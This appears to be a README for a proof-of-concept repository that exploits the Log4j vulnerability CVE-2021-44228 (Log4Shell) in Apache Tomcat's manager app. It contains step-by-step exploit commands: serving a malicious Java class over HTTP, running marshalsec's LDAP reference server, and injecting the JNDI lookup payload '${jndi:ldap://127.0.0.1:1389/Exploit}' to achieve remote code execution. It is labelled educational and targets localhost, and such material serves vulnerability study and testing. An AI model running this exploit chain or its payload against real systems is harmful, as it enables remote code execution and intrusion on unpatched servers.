# Log4j2 CVE-2021-44228 Vulnerability POC in Apache Tomcat


## Preview
![GIF](./assets/images/log4jshell_tomcat.gif)


## Setup

### Start tomcat server
```
git clone
cd apache-tomcat-10.0.14/bin
startup.bat
```
### Serve the exploit class
```
cd exploit
py -m http.server 8888
```
```
cd exploit
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8888/#Exploit"
```

### Attack
Input ${jndi:ldap://127.0.0.1:1389/Exploit} in the field 'XML Configuration file path' inside http://localhost:8080/manager/html manager app

Exploit class is loaded and RCE done (Calculator app will be loaded)

## Disclaimer

The repo is just a POC done for educational purpose.

## References
LDAP exploit https://github.com/mbechler/marshalsec
